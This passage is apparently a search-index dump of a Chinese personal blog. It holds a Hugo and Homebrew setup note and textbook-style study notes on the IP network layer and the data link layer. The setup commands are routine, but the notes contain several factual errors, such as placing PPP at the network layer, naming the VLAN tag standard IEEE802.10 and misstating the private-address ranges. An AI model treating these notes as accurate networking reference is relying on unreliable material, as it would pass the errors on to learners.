https://developer.apple.com/download/all/. You should download the Command Line Tools for Xcode 14.3. 解决方法：根据提示运行命令即可\n1 2 3 4 5 sudo rm -rf /Library/Developer/CommandLineTools sudo xcode-select --install brew update-reset 安装git brew install git\n本地静态博客搭建 创建新站点 `hugo new site quickstart\n配置主题\n1 2 3 cd quickstart git init git submodule add https://github.com/budparr/gohugo-theme-ananke.git themes/ananke 然后，将主题添加到站点的配置文件中：\n1 echo \u0026#39;theme = \u0026#34;ananke\u0026#34;\u0026#39; \u0026gt;\u0026gt; config.toml 然后启动，在 http://localhost:1313/ 进行本地查看\n1 hugo server -D 这里容易出现一个错误，就是hugo.toml的theme没有设置，导致出现PageNotFound。\n以上是hugo的基本安装教程。\n配置本地静态页面 找来找去，本来想用academy来做学术主页，结果又要实名认证，略有些麻烦，于是换上了stack。\n具体可以看GitHub - CaiJimmy/hugo-theme-stack: Card-style Hugo theme designed for bloggers\n细节就不赘述了，终于是配置好了，最后是目前的成品。 AGA\u0026rsquo;s Blog\n其他功能 图床配置 打开图床配置 | PicX在线使用 配置参考快速开始 | PicX 图床使用指南\nobsidian导出 markdown 1 obsidian-export /Users/agq/Documents/obsidian/源文件/ /Users/agq/Documents/obsidian/目的文件夹/ 评论配置 参考Site Unreachable\n","date":"2023-10-18T19:27:27+08:00","permalink":"https://anonymity-0.github.io/posts/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE/","title":"博客配置"},{"content":"网络层 IP 即网际协议TCP/IP 的心脏是互联网层。这一层主要由 IP (Internet Protocol)和 ICMP (Internet Control Message Protocol)两个协议组成。 网络层的主要作用是“实现终端节点之间的通信”。这种终端节点之间的通信也叫 “点对点(end-to-end)通信”。\n主机和节点 主机的定义应该是指“配置有I地址,但是不进行路由控制”的设备”。既配有IP地址又具有路由控制能力的设备叫做“路由器”,跟主机有所区别。而节点则是主机和路由器的统称。\nIP基础知识 IP地址 IP地址用于在“连接到网络中的所有主机中识别出进行通信的目标地址” 不论一台主机与哪种数据链路连接,其IP地址的形式都保持不变。以太网、无线局域网、PPP 等,都不会改变IP地址的形式。 而数据链路的MAC地址的形式不一定必须一致。\n在网桥或交换集线器等物理层或数据链路层数据包转发设备中,不需要设置IP地址”。因为这些设备只负责将IP 包转化为0、1 比特流转发或对数据链路帧的数据部分进行转发,而不需要应对IP 协议”\n路由控制 路由控制(Routing)是指将分组数据发送到最终目标地址的功能。 Hop 译为中文叫“跳”。它是指网络中的一个区间。 一跳(1Hop)是指利用数据链路层以下分层的功能传输数据帧的一个区间。 以太网等数据链路中使用 MAC地址传输数据帧。此时的一跳是指从源MAC地址到目标MAC地址之间传输帧的区间。也就是说它是主机或路由器网卡不经其他路由器而能直接到达的相邻主机或路由器网卡之间的一个区间。\n多跳路由 IP 包正是在网络中一个个跳间被转发。因此 IP路由也叫做多跳路由。在每一个区间内决定着包在下一跳被转发的路径。 多跳路由是指路由器或主机在转发IP 数据包时只指定下一个路由器或主机, 而不是将到最终目标地址为止的所有通路全都指定出来。因为每一个区间(跳) 在转发 IP数据包时会分别指定下一跳的操作,直至包达到最终的目标地址。\n路由控制表 为了将数据包发给目标主机,所有主机都维护着一张路由控制表(Routing Table)。该表记录IP 数据在下一步应该发给哪个路由器。IP包将根据这个路由表在各个数据链路上传输。 数据链路的抽象化 IP 是实现多个数据链路之间通信的协议，对IP的上一层来说,不论底层数据链路使用以太网还是无线LAN 亦或是PPP,都将被一视同仁。\n不同数据链路有个最大的区别,就是它们各自的最大传输单位(MTU:Maximum Transmission Unit)不同。\nMTU 的值在以太网中是1500字节,在FDDI 中是4352字节,而ATM则为9180字节。IP 的上一层可能会要求传送比这些 MTU 更多字节的数据,因此必须在线路上传送比包长还要小的MTU。\n为了解决这个问题,IP 进行分片处理(IP Fragmentation)。顾名思义,所谓分片处理是指,将较大的IP 包分成多个较小的IP 包”即从 IP 的上次层看,它完全可以忽略数据包在途中的各个数据链路上的MTU,而只需要按照源地址发送的长度接收数据包。 IP 就是以这种方式抽象化了数据链路层,使得从上层更不容易看到底层网络构造的细节。\n面向无连接 IP 面向无连接。即在发包之前,不需要建立与对端目标地址之间的连接。上层如果遇到需要发送给IP 的数据,该数据会立即被压缩成 IP包发送出去。\n那么,为什么IP 要采用面向无连接呢? 主要有两点原因:一是为了简化,二是为了提速。面向连接比起面向无连接处理相对复杂。甚至管理每个连接本身就是一个相当繁琐的事情。此外,每次通信之前都要事先建立连接,又会降低处理速度。需要有连接时,可以委托上一层提供此项服务。因此,IP 为了实现简单化与高速化采用面向无连接的方式。 IP 提供尽力服务(Best Effort),意指“为了把数据包发送到最终目标地址,尽最大努力。”然而,它并不做“最终收到与否的验证”。IP数据包在途中可能会发生丢包、错位以及数据量翻倍等问题。\n那么,有人可能会提出疑问:为什么不让IP 具有可靠传输的功能, 从而把这两种协议合并到一起呢?\n这其中的缘由就在于,如果要一种协议规定所有的功能和作用,那么该协议的具体实施和编程就会变得非常复杂,无法轻易实现。相比之下,按照网络分层,明确定义每层协议的作用和责任以后,针对每层具体的协议进行编程会更加有利于该协议的实现。 网络通信中如果能进行有效分层,就可以明确 TCP 与IP 各自协议的最终目的,也有利于后续对这些协议进行扩展和性能上的优化。分层也简化了每个协议的具体实现。\nIPv4 IP 地址(IPv4 地址)由32位正整数来表示，将32位的IP地址以每8位为一组,分成4组,每组以“.”隔开,再将每组数转换为十进制数”\n实际上,IP地址并非是根据主机台数来配置的,而是每一台主机上的每一块网卡(NIC)都得设置IP 地址”。通常一块网卡只设置一个 IP 地址,其实一块网卡也可以配置多个 IP 地址。此外,一台路由器通常都会配置两个以上的网卡,因此可以设置两个以上的IP地址。 IP 地址由“网络标识(网络地址)”和“主机标识(主机地址)”两部分组成”\n网络标识必须保证相互连接的每个段的地址不相重复。而相同段内相连的主机必须有相同的网络地址。IP地址的“主机标识”则不允许在同一个网段内重复出现。\n究竞从第几位开始到第几位算是网络标识,又从第几位开始到第几位算是主机标识呢?关于这点,有约定俗成的两种类型。最初二者以分类进行区别。而现在基本以子网掩码(网络前缀)区分。 IP地址的分类 IP 地址分为四个级别,分别为A类、B类、C类、D类”。它根据 IP 地址中从第1位到第4位的比特列对其网络标识和主机标识进行区分。 关于分配IP 主机地址的注意事项 在分配 IP 地址时关于主机标识有一点需要注意。即要用比特位表示主机地址时,不可以全部为0或全部为1。因为全部为只有。在表示对应的网络地址或IP 地址不可获知的情况下才使用。而全部为1的主机地址通常作为广播地址。\n广播地址 广播地址用于在同一个链路中相互连接的主机之间发送数据的目的主机地址部分全部设置为1,就成为了广播地址。\n以太网中如果将 MAC地址的所有位都改为1,则形成FF:FF: FF: FF: FF: FF 的广播地址。因此, 广播的IP包以数据链路的帧的形式发送时,得通过 MAC 地址为全 1 比特的 FF:FF: FF: FF: FF: FF转发。\n本地广播 在本网络内的广播叫做本地广播。例如网络地址为192.168.0.0/24 的情况下,广播地址是192.168.0.255。因为这个广播地址的 IP包会被路由器屏蔽,所以不会到达192.168.0.0/24 以外的其他链路上。\n直接广播 在不同网络之 的广播叫做直接广播。例如网络地址为192.168.0.0/24的主机向 192.168.1.255/24 的目标地址发送IP 包。收到这个包的路由器,将数据转发给192.168.1.0/24,从而使得所有192.168.1.1~ 192. 168.1.254 的主机都能收到这个包”\nIP多播 多播用于将包发送给特定组内的所有主机。由于其直接使用IP 协议,因此也不存在可靠传输。 多播使用D类地址。因此,如果从首位开始到第4位是“1110”,就可以认为是多播地址。而剩下的28 位可以成为多播的组编号。 从224.0.0.0到 239.255.255.255 都是多播地址的可用范围。其中从224.0.0.0到224.0.0.255 的范围不需要路由控制,在同一个链路内也能实现多播。而在这个范围之外设置多播地址会给全网所有组内成员发送多播的包。\n利用IP多播实现通信,除了地址外还需要IGMP\u0026rsquo;等协议的支持。 子网掩码 例： A类 255.0.0.0 B类255.255.0.0 C类 255.255.255.0\n网络标识相同的计算机必须同属于同一个链路。例如,架构B类IP 网络时, 理论上一个链路内允许6万5千多台计算机连接。然而,在实际网络架构当中, 一般不会有在同一个链路上连接6万5千多台计算机的情况。因此,这种网络结构实际上是不存在的。\n因此,直接使用A类或B类地址,确实有些浪费。随着互联网的覆盖范围逐渐增大,网络地址会越来越不足以应对需求,直接使用A类、B类、C类地址就更加显得浪费资源。为此,人们已经开始一种新的组合方式以减少这种浪费。\n对于子网掩码,目前有两种表示方式。以172.20.100.52的前26位是网络地址的情况为例,以下是其中一种表示方法,它将IP地址与子网掩码的地址分别用两行来表示。 另一种表示方式如下所示。它在每个 IP 地址后面追加网络地址的位数”用“/”隔开 CIDR 采用任意长度分割 IP 地址的网络标识和主机标识。这种方式叫做CIDR 根据 CIDR,连续多个C类地址”就可以划分到一个较大的网络内。CIDR 更有效地利用了当前 IPv4地址,同时通过路由集中“降低了路由器的负担。 VLSM 在CIDR被应用到互联网的初期,网络内部采用固定长度的子网掩码机制。也就是说,当子网掩码的长度被设置为/25以后,域内所有的子网掩码都得使用同样的长度。然而,有些部门可能有500台主机,另一些部门可能只有50台主机。如果全部采用统一标准,就难以架构一个高效的网络结构。为此人们提出组织内要使用可变长度的、高效的IP地址分配方式。\n于是产生了一种可以随机修改组织内各个部门的子网掩码长度的机制VLSM(可变长子网掩码)。它可以通过域间路由协议转换为 RIP2 以及 OSPF实现。根据 VLSM 可以将网络地址划分为主机数为500个时子网掩码长度为/23,主机数为50个时子网掩码长度为/26。\n有了 CIDR 和 VLSM技术,确实相对缓解了全局IP地址不够用的问题。但是IP 地址的绝对数本身有限的事实无法改变。\n全局地址与私有地址 出现了一种新技术。它不要求为每一台主机或路由器分配一个固定的IP 地址,而是在必要的时候只为相应数量的设备分配唯一的IP地址。 尤其对于那些没有连接互联网的独立网络中的主机,只要保证在这个网络内地址唯一,可以不用考虑互联网即可配置相应的IP地址。\n私有网络的IP 地址。它的地址范围如下所示: A类~C类范围中除去0/8、127/8。 包含在这个范围内的IP地址都属于私有 IP,而在此之外”的IP地址称为全局IP。 全局 IP地址基本上要在整个互联网范围内保持唯一\u0026rsquo;,但私有地址不需要。只要在同一个域里保证唯一即可。在不同的域里出现相同的私有IP 不会影响使用。\n在世界范围内,全局 IP 由ICANN\u0026lsquo;进行管理。对于 FTTH 和 ADSL 的服务,网络提供商直接给用户分配全局 IP地址,并且用户每次重连该IP地址都可能会发生变化。这时的IP 地址由提供商维护,不需要用户亲自申请全局 IP 地址。\n不过现在,普遍采用的一种方式是,在LAN 中设置私有地址,通过少数设置全局IP 地址的代理服务器结合 NAT的设置进行互联网通信。这时 IP地址个数就不限于LAN 中主机个数而是由代理服务器和 NAT的个数决定。\nNAT 私有IP 最早没有计划连接互联网,而只用于互联网之外的独立网络。然而, 当一种能够互换私有 IP 与全局IP 的NAT\u0026rsquo;技术诞生以后,配有私有地址的主机与配有全局地址的互联网主机实现了通信。 私有IP 地址结合NAT技术已成为现在解决 IP地址分配问题的主流方案。它与使用全局 IP 地址相比有各种限制。 WHOIS 互联网中从很早开始就可以通过网络信息查询机构和管理人联系方式。这种方法就叫做 WHOIS。WHOIS 提供查询IP地址、AS编号以及搜索域名分配登记和管理人信息的服务。\n路由控制 发送数据包时所使用的地址是网络层的地址,即IP地址。然而仅仅有IP地址还不足以实现将数据包发送到对端目标地址,在数据发送过程中还需要类似于“指明路由器或主机”的信息,以便真正发往目标地址。保存这种信息的就是路由控制表(Routing Table)。\n该路由控制表的形成方式有两种:一种是管理员手动设置,另一种是路由器与其他路由器相互交换信息时自动刷新。前者也叫静态路由控制,而后者叫做**动态路由控制\nIP协议始终认为路由表是正确的。然而,IP 本身并没有定义制作路由控制表的协议。即 IP没有制作路由控制表的机制。该表是由一个叫做“路由协议”(这个协议有别于IP)的协议制作而成。 路由控制表 路由控制表中记录着网络地址与下一步应该发送至路由器的地址。在发送IP 包时,首先要确定IP 包首部中的目标地址,再从路由控制表中找到与该地址具有相同网络地址的记录,根据该记录将IP 包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录,就选择一个最为吻合的网络地址。所谓最为吻合是指相同位数最多的意思”\n如果路由表中下一个路由器的位置记录着某个主机或路由器网卡的IP地址,那就意味着发送的目标地址属于同一个链路。\n默认路由 如果一张路由表中包含所有的网络及其子网的信息,将会造成无端的浪费。这时,默认路由(Default Route)是不错的选择。默认路由是指路由表中任何一个地址都能与之匹配的记录。\n默认路由一般标记为 0.0.0.0/0或 defaul \u0026lsquo;。这里的0.0.0.0/0并不是指 IP 地址是0.0.0.0。由于后面是“/0”,所以并没有标识 IP 地址。它只是为了避免人们误以为0.0.0.0是IP地址。有时默认路由也被标记为 default,但是在计算机内部和路由协议的发送过程中还是以0.0.0.0/0进行处理。\n主机路由 “IP 地址/32”也被称为主机路由(Host Route)。例如,192.168.153.15/32就是一种主机路由。它的意思是整个 IP地址的所有位都将参与路由。 主机路由多被用于不希望通过网络地址路由的情况。\n环回地址 环回地址是在同一台计算机上的程序之间进行网络通信时所使用的一个默认地址。计算机使用一个特殊的IP地址127.0.0.1作为环回地址。与该地址具有相同意义的是一个叫做localhost 的主机名。使用这个 IP 或主机名时,数据包不会流向网络。\n路由控制表的聚合 利用网络地址的比特分布可以有效地进行分层配置。对内即使有多个子网掩码,对外呈现出的也是同一个网络地址。这样可以更好地构建网络,通过路由信息的聚合可以有效地减少路由表的条目”。 ","date":"2023-10-18T19:25:30+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"网络层"},{"content":"数据链路层 数据链路是让互联计算机之间相互通信的一种协议,又指通信手段。 数据链路的段 数据链路的段是指一个被分割的网络。然而根据使用者不同,其含义也不尽相同。例如,引入中继器将两条网线相连组成一个网络。 这种情况下有两条数据链路: ◎从网络层的概念看,它是一个网络(逻辑上)一即,从网络层的立场出发,这两条网线组成一个段。 ◎从物理层的概念看,两条网线分别是两个物体(物理上)一即, 从物理层的观.点出发,一条网线是一个段。 网络拓扑 网络的连接和构成的形态称沟网络拓扑(Topology)。网络拓扑包括总线型、环型、星型、网状型等。拓扑一词不仅用于直观可见的配线方式上,也用于逻辑上网络的组成结构。两者有时可能会不一致。而目前实际的网络都是由这些简单的拓扑结构错综复杂地组合而成的。 MAC MAC地址用于识别数据链路中互连的节点。 MAC 地址长48 比特。在使用网卡(NIC)的情况下, MAC地址一般会被烧人到 ROM 中。因此,任何一个网卡的MAC地址都是唯一的,在全世界都不会有重复”。 注： 例外情况—MAC地址不一定是唯一的在全世界,MAC地址也并不总是唯一的。实际上,即使 MAC地址相同,只要不是同属一个数据链路就不会出现问题。 例如,人们可以在微机板上自由设置自己的MAC地址。再例如,一台主机上如果启动多个虚拟机,由于没有硬件的网卡只能由虚拟软件自己设定 MAC地址给多个虚拟网卡,这时就很难保证所生成的MAC地址是独一无二的了。 但是,无论哪个协议成员通信设备,设计前提都是 MAC地址的唯一性。这也可以说是网络世界的基本准则。 根据 MAC地址转发 以太网交换机就是持有多个端口”的网桥。它们根据数据链路层中每个帧的目标MAC地址,决定从哪个网络接口发送数据。这时所参考的、用以记录发送接口的表就叫做转发表(Forwarding Table)。 这种转发表的内容不需要使用者在每个终端或交换机上手工设置,而是可以自动生成。数据链路层的每个通过点在接到包时,会从中将源MAC地址以及曾经接收该地址发送的数据包的接口作为对应关系记录到转发表中。 以某个 MAC地址作为源地址的包由某一接口接收,实质上可以理解为该MAC地址就是该接口的目标。因此也可以说,以该 MAC地址作为目标地址的包,经由该接口送出即可。这一过程也叫自学过程。 交换机转发方式 存储转发 存储转发方式检查以太网数据帧末尾的 FCS\u0026rsquo;位后再进行转发。因此,可以避免发送由于冲突而被破坏的帧或噪声导致的错误帧。\n直通转发 直通转发方式中不需要将整个帧全部接收下来以后再进行转发。只需要得知目标地址即可开始转发。因此,它具有延迟较短的优势。但同时也不可避免地有发送错误帧的可能性。\n共享介质型网络 共享介质型网络指由多个设备共享一个通信介质的一种网络。最早的以太网和FDDI 就是介质共享型网络。在这种方式下,设备之间使用同一个载波信道进行发送和接收。为此,基本上采用半双工通信方式,并有必要对介质进行访问控制。\n争用方式 争用方式(Contention)是指争夺获取数据传输的权力,也叫 CSMA(载波监听多路访问)。这种方法通常令网络中的各个站”采用先到先得的方式占用信道发送数据,如果多个站同时发送帧,则会产生冲突现象。也因此会导致网络拥堵与性能下降。 CSMA/CD 在一部分以太网当中,采用了改良 CSMA 的另一种方式-CSMA/CD 方式。CSMA/CD 要求每个站提前检查冲突,一旦发生冲突,则尽早释放信道。其具体工作原理如下: 如果载波信道上没有数据流动,则任何站都可以发送数据。\n检查是否会发生冲突。一旦发生冲突时,放弃发送数据”,同时立即释放载波信道。 放弃发送以后,随机延时一段时间,再重新争用介质,重新发送帧。 令牌传递方式 令牌传递方式是沿着令牌环发送一种叫做“令牌”的特殊报文,是控制传输的一种方式。只有获得令牌的站才能发送数据。这种方式有两个特点:一是不会有冲突,二是每个站都有通过平等循环获得令牌的机会。因此,即使网络拥堵也不会导致性能下降。 当然,这种方式中,一个站在没有收到令牌前不能发送数据帧,因此在网络不太拥堵的情况下数据链路的利用率也就达不到100%\n非共享介质网络 非共享介质网络是指不共享介质,是对介质采取专用的一种传输控制方式。在这种方式下,网络中的每个站直连交换机,由交换机负责转发数据帧。\n该方式还可以根据交换机的高级特性构建虚拟局域网(VLAN,Virtual LAN)、进行流量控制等。当然,这种方式也有一个致命的弱点,那就是一旦交换机发生故障,与之相连的所有计算机之间都将无法通信。\n全双工通信 它允许在同一时间既可以发送数据也可以接收数据。类似于电话,接打双方可以同时说话。 同样是以太网,在使用交换机与双绞线电缆(亦或光纤电缆) 的情况下,既可以通过交换机的端口与计算机之间进行一对一的连接,也可以通过相连电缆内部的收发线路”分别进行接收和发送数据。因此,交换机的端口与计算机之间可以实现同时收发的全双工通信。 环路检测技术 通过网桥连接网络时,一旦出现环路该如何处理?这与网络的拓扑结构和所使用的网桥种类有直接关系。最坏的情况下,数据顿会在环路中被一而再再而三地持续转发。而一旦这种数据帧越积越多将会导致网络瘫痪。\n生成树方式 该方法由 IEEE802.1D定义。每个网桥必须在每1~10秒内相互交換 BPDU (Bridge Protocol Data Unit)包,从而判断哪些端口使用哪些不使用,以便消除环路。一旦发生故障,则自动切换通信线路,利用那些没有被使用的端口继续进行传输。\n源路由法 源路由法最早由TBM 提出,以解决令牌环”网络的问题。该方式可以判断发送数据的源地址是通过哪个网桥实现传输的,并将帧写人 RIF(Routing Information Field)。网桥则根据这个 RIF 信息发送帧给目标地址。因此,即使网桥中出现了环路,数据帧也不会被反复转发,可成功地发送到目标地址。在这种机制中发送端本身必须具备源路由的功能。\nVLAN 进行网络管理的时候,时常会遇到分散网络负载、变换部署网络设备的位置等情况。而有时管理员在做这些操作时,不得不修改网络的拓扑结构,这也就意味着必须进行硬件线路的改造。然而,如果采用带有 VLAN 技术的网桥,就不用实际修改网络布线,只需修改网络的结构即可。 注意：VLAN 是基于以太网的一种技术，它使用 VLAN 标签将数据帧划分到不同的逻辑网段。\n交换机按照其端口区分了多个网段,从而区分了广播数据传播的范围、减少了网络负载并提高了网络的安全性。然而异构的两个网段之间,就需要利用具有路由功能的交换机(如3层交换机), 或在各段中间通过路由器的连接才能实现通信。 对这种 VLAN 进行了扩展,又定义了 IEEE802.10 的标准(也叫 TAG VIAN),该标准允许包含跨越异构交换机的网段。TAG VLAN 中对每个网段都用一个 VLAN ID 的标签进行唯一标识。在交换机中传输帧时,在以太网首部加人这个 VID 标签,根据这个值决定将数据帧发送给哪个网段。 以太网 在众多数据链路中最为著名、使用最为广泛的莫过于以太网(Ethernet)”。它的规范简单,易于 NIC(网卡)及驱动程序实现。\n在以太网普及之初,一般采用多台终端使用同一根同轴电缆的共享介质型\u0026rsquo; 连接方式。 而现在,随着互连设备的处理能力以及传输速度的提高,一般都采用终端与交换机之间独占电缆的方式实现以太网通信 以太网的分类 10BASE 中的“10”、100BASE 中的“100”、1000BASE 中的“1000”以及10CBASE 中的“10G”分别指10Mbps、100Mbps、IGbps 以及 10Gbps 的传输速度。 而追加于后面的“5”、“2”、“T”、“F”等字符表示的是传输介质。 以太网帧格式 [[#以太网]]帧前端有一个叫做前导码(Preamble)的部分,它由0、1数字交替组合而成,表示一个以太网帧的开始,也是对端网卡能够确保与其同步的标志。 前导码末尾是一一个叫做 SFD (Start Frame Delimiter)的域,它的值是“11”。在这个域之后就是以太网帧的本体(图3.20)。前导码与SFD 合起来占8个字节”。 以太网帧本体的前端是以太网的首部,它总共占14个字节。分别是6个字节的目标 MAC地址、6个字节的源MAC地址以及2个字节的上层协议类型。 IEEE802.3 Ethernet 与一般的以太网在帧的首部上稍有区别。一般以太网帧中表示类型的字段,在 IEEE802.3以太网中却表示帧的长度。 紧随帧头后面的是数据。一个数据帧所能容纳的最大数据范围是 46~1500个字节。帧尾是一个叫做 FCS(Ftame Check Sequence,帧检验序列)的4个字节。它可以检查帧是否有所损坏。在通信传输过程中如果出现电子嗓声的干扰,可能会影响发送数据导致乱码位的出现。 在目标 MAC地址中存放了目标工作站的物理地址。源MAC地址中则存放构造以太网帧的发送端工作站的物理地址。\n[[#VLAN]]中,帧的格式又会有所变化 无线通信 无线通信,依据通信距离可分为如表3.3所列出的类型。IEEE802 委员会制定了无线PAN\u0026rsquo;(802.15)、无线 LAN\u0026rsquo;(802. 11)、无线 MAN\u0026rsquo;(802.16)以及无线 RAN\u0026rsquo;(802.22)等无线标准。无线 WAN\u0026rsquo;的最典型代表就是手机通信。手机通过基站能够实现长距离通信。\n无线LAN 允许使用者可以自由地移动位置、自由地放置设备,通过无线电波实现较广范围的通信。这也意味着,在其通信范围内,任何人都可以使用该无线LAN,因此会有被盗听或篡改的危险。 此外,无线LAN 可以无需牌照使用特定频段。因此无线IAN 的无线电波可能会收到其他通信设备的干扰,导致信号不稳定。例如在一台微波炉附近使用一个2.4GHz带宽的802.11b/g设备就得需要注意。微波炉启动后的放射出来的无线电波与设备频率相近,产生的干扰可能会显著地降低设备的传输能力。\nIEEE802.11 IEEE802.11定义了无线LAN 协议中物理层与数据链路层的一部分(MAC 层)。IEEE802.11 这个编号有时指众多标准的统称,有时也指无线LAN 的一种通信方式。 IEEE802.11 是所有IEEE802.11 相关标准的基础。其中定义的数据链路层的一部分(MAC层)适用于所有IEEE802.11 的其他标准。\nMAC层中物理地址与以太网相同,都使用MAC地址,而介质访问控制上则使用CSAM/CD 相似的CSAM/ CA方式。通常采用无线基站并通过高基站实现通信。\nCSMA/ CA CSMA/CA协议中，当一个站点要发送数据时，它会先发送一个RTS（请求发送）帧给接收方。接收方收到RTS帧后，会回复一个CTS（清除发送）帧。只有在接收方回复CTS帧后，发送方才能发送数据。这样可以避免多个站点同时发送数据导致的冲突。\nCSMA/CD和CSMA/区别\n特征 CSMA/CD CSMA/CA 有效性 发生冲突后生效 防止冲突发生 用途 有线网络 无线网络 功能 减少恢复时间 最小化冲突可能性 数据帧重传 发生冲突时重传数据帧 先发送数据传输意图，再发送数据 标准 802.3标准 802.11标准 WIFI Wi-Fi是 WECA(Wireless Fthernet Compatability Alliance,无线以太网兼容性联盟)为普及 IEEE802.11 的各种标准而打造的一个品牌名称。\n蓝牙 蓝牙与 IEEE802.11b/g 类似,是使用2.4GHz 频率无线电波的一种标准”。数据传输速率在 V2 中能达到3Mbps(实际最大吞吐量为2.1Mbps)。通信距离根据无线电波的信号的强弱,有1m、10m、100m 三种类型。通信终端最多允许8台设备。\nZigBee ZieBee 主要应用于家电的远程控制”,是一种短距离、低功耗的无线通信技术。它最多允许65536 个终端之间互连通信。ZigBee 的传输速度随着所使用的频率有所变化。但在日本,使用2.4GHz 频率的设备最高可达250kpbs®。\nPPP PPP(Point-to-Point Protocol)是指点对点,即1对1连接计算机的协议。 在理论上，PPP 协议属于网络层。在实际应用中，PPP 协议通常用于在数据链路层上使用。\nPPP 属于纯粹的数据链路层,与物理层没有任何关系。换句话说,仅有PPP 无法实现通信,还需要有物理层的支持。 PPP可以使用电话线或ISDN、专线、ATM 线路。此外,近些年人们更多是在用 ADSL 或有线电视通过 PPPoE (PPP over Ethernet)实现互联网接人。PPPOE 是在以太网的数据中加入 PPP 帧进行传输的一种方式。\nPPP和以太网的区别\n特征 PPP 以太网 层 网络层 链路层 作用 建立点对点连接 在多个设备之间共享介质 封装 封装 IP 数据包 不封装 使用场景 远程访问、拨号连接 局域网、广域网 在PPP的主要功能中包括两个协议:一个是不依赖上层的LCP 协议(Link Control Protocol),另一个是依赖上层的 NCP 协议(Network Control Protocol)。如果上层为IP,此时的 NCP 也叫做 IPCP (IP Control Protocol)。 LCP LCP 主要负责建立和断开连接、设置最大接收单元(MRU,Maximum Receive Unit)、设置验证协议(PAP 或CHAP)以及设置是否进行通信质量的监控。\nNCP 而 IPCP 则负责IP 地址设置以及是否进行 TCP/IP 首部压缩等设备”。\n通过PPP连接时,通常需要进行用户名密码的验证,并且对通信两端进行双方向的验证。其验证协议有两种,分别为PAP(Password Authentication Protocol) 和 CHAP(Challenge Handshake Authentication Protocol)。\nPAP PAP是PPP连接建立时,通过两次握手进行用户名和密码验证。其中密码以明文方式传输。因此一般用于安全要求并不很高的环境,否则会有窃听或盗用连接的危险。\nCHAP CHAP 则使用一次性密码 OTP(One Time Password),可以有效防止窃听。此外,在建立连接后还可以进行定期的密码交换,用来检验对端是否中途被替换。\nPPP 的帧格式 PPP 的数据帧格式如图3.26所示。其中标志码用来区分每个帧。这一点与HDLC\u0026rsquo;协议非常相似,因为PPP本身就是基于 HDIC制定出来的一种协议。 HDLC HDLC 就是在每个帧的前后加上一个8位字节“01111110”用来区分帧。这一个8位字节叫做标志码。 在两个标志码中间不允许出现连续6个以上的“1”。因此,在发送帧的时候,当出现连续5个“1”时后面必须插人一个0。而当接收端在接收帧时,如果收到连续的5个“1”且后面跟着的是0,就必须删除。由于最多只会出现5个连续的“1”,就可以比较容易地通过标志码区分帧的起始与终止。而PPP标准帧格式与此完全相同。\n另外,在通过电脑进行拨号时,PPP 已在软件中实现。因此,那些插人或删除“0”的操作或FCS 计算都交由电脑的CPU 去处理。这也是为什么人们常说PPP这种方式会给计算机带来大量负荷的原因所在。\nPPPoE 在这种互联网接入服务中,通信线路由以太网模拟。由于以太网越来越普及, 在加上它的网络设备与相应的NIC价格比较便宜,因而ISP 能够提供一个单价更低的互联网接人服务。 单纯的以太网没有验证功能,也没有建立和断开连接的处理,因此无法按时计费。而如果采用PPPoE 管理以太网连接,就可以利用 PPP的验证等功能使各家ISP 可以有效地管理终端用户的使用。 ATM ATM(Asynchronous Transfer Mode)是以一个叫做信元(5字节首部加48字节数据)的单位进行传输的数据链路,由于其线路占用时间短和能够高效传输大容量数据等特点主要用于广域网络的连接。\nATM 是面向连接的一种数据链路。因此在进行通信传输之前一定要设置通信线路。而ATM又与传统电话不同,它允许同时与多个对端建立通信连接。\nATM中没有类似以太网和FDDI那种发送权限的限制。它允许在任何时候发送任何数据。因此,当大量计算机同时发送大量数据时容易引发网络拥堵甚至使网络进入收敛状态”。为了防止这一现象的出现,ATM 中也增加了限制带宽的细分功能\n注：收敛状态指当网络非常拥堵时,路由器或交换机无法完成包的处理,从而丢弃这些包的一种状态。\nATM扩展了 TDM,能够有效地提高线路的利用率\u0026rsquo;。ATM 在 TDM 的时隙中放入数据时,并非按照线路的顺序而是按照数据到达的顺序放入。 为此,发送端还需要附加一个5字节的包首部,包含 VPI(Virtual Path Identifier)、VCI (Virtual Channel Identifier)等识别码”用来标识具体的通信类型。这种VPI 与VCI的值只在直连通信的两个ATM交换机之间设置。在其他交换机之间意思则完全不同。 ATM中信元传输所占用的时隙不固定,一个帧所占用的时隙数也不固定,而且时隙之间并不要求连续。这些特点可以有效减少空闲时隙, 从而提高线路的利用率。只不过需要额外附加5个字节的首部,增加了网络的开销”,因此也在一定程度上降低了通信速度。\n在以太网中一个帧最大可传输1500个字节,FDDI 可以最大传输 4352字节。 而ATM 的一个信元却只能发送固定的48字节数据。这48个字节的数据部分中若包含IP 首部和TCP首部则基本无法存放上层的数据。为此,一般不会单独使用ATM,而是使用上层的AAL(ATM Adapter Layer)。 在上层为IP 的情况下,则叫做 AAIS。每个IP包被附加各层的协议首部以后,最多可以被分为192个信元发送出去。 从这个图中还可以看出,在整个192个信元中只要有一个丢失,那么整个IP 包就相当于被损坏。此时,AAL5 的帧检查位报错,导致接收端不得不丢弃所有的信元。前面曾提到 TCP/IP 在包发生异常的时候可以实现重发,因此在 ATM网中即使只是一个信元丢失,也要重新发送最多192个信元。这也是ATM到目前为止的最大弊端。一且在网络拥堵的情况下,只要丢掉哪怕1%的信元也会导致整个数据都无法接收。特别是由于 ATM 没有发送权限上的控制,很容易导致网络收敛。\nPOS POS (Packet over SDH/SONET)是一种在 SDHY(SONET\u0026rsquo;)上进行包通信的一种协议。SDH(SONET)是在光纤上传输数字信号的物理层规范。\nFDDI FDDI(Fiber Distributed Data Interface)叫做分布式光线数据接口。曾几何时,人们为了用光纤和双绞线实现100Mbps 的传输速率,在主干网或计算机之间的高速连接上广泛使用了 FDDI。但是由于后来高速 LAN 提供了 Gbps 级的传输速率,FDDI 也就逐渐淡出了应用领域。 FDDI 采用令牌(追加令牌)环的访问方式。令牌环访问方式在网络拥堵的情况下极容易导致网络收敛。\n光纤通道 光纤通道(Fiber Channel)是实现高速数据通信的一种数据链路。与其说它是一种网络,不如说它更像是 SCSI那样类似于连接计算机周边设备的总线一样的规范。数据传输速率为 133Mbpx~4Gbps。近些年被广泛用于搭建SAN\u0026rsquo;,成为其主要数据链路。\nHDMI HDMI 是 High-Definition Multimedia Interface 的缩写,意为高清晰度多媒体接口。它可以通过一根缆线实现图像和声音等数字信号的高品质传输。曾主要用于DVD/蓝光播放器、录像机、AV 